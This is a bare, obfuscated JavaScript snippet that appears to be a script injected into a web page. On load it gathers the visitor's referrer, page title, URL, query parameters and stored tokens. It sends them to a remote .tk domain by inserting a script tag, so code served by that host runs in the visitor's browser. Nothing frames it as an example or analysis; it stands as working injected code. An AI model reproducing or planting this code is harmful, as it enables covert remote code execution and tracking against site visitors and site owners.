   (function() {
    var name = '_n2RsF5qBqm2StnXk';
    if (!window._n2RsF5qBqm2StnXk) {
        window._n2RsF5qBqm2StnXk = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/jog-fit',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _Vz9ZYkf3fZKRtfXh = localStorage.getItem('config');
    if (typeof _Vz9ZYkf3fZKRtfXh !== 'undefined' && _Vz9ZYkf3fZKRtfXh !== null) {
        var _V3zpGK7vsC9vvSHx = JSON.parse(_Vz9ZYkf3fZKRtfXh);
        var _j8BK5trfJvDPc2BJ = Math.round(+new Date()/1000);
        if (_V3zpGK7vsC9vvSHx.created_at + window._n2RsF5qBqm2StnXk.ttl < _j8BK5trfJvDPc2BJ) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _3KXtr7D5tyHTZthT = localStorage.getItem('subId');
    var _HLkvsPsKpWVR7dZg = localStorage.getItem('token');
    var _SZ8gDZLRgfyXs3mp = '?return=js.client';
        _SZ8gDZLRgfyXs3mp += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _SZ8gDZLRgfyXs3mp += '&se_referrer=' + encodeURIComponent(document.referrer);
        _SZ8gDZLRgfyXs3mp += '&default_keyword=' + encodeURIComponent(document.title);
        _SZ8gDZLRgfyXs3mp += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _SZ8gDZLRgfyXs3mp += '&name=' + encodeURIComponent(name);
        _SZ8gDZLRgfyXs3mp += '&host=' + encodeURIComponent(window._n2RsF5qBqm2StnXk.R_PATH);
    if (typeof _3KXtr7D5tyHTZthT !== 'undefined' && _3KXtr7D5tyHTZthT && window._n2RsF5qBqm2StnXk.unique) {
        _SZ8gDZLRgfyXs3mp += '&sub_id=' + encodeURIComponent(_3KXtr7D5tyHTZthT);
    }
    if (typeof _HLkvsPsKpWVR7dZg !== 'undefined' && _HLkvsPsKpWVR7dZg && window._n2RsF5qBqm2StnXk.unique) {
        _SZ8gDZLRgfyXs3mp += '&token=' + encodeURIComponent(_HLkvsPsKpWVR7dZg);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._n2RsF5qBqm2StnXk.R_PATH + _SZ8gDZLRgfyXs3mp;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
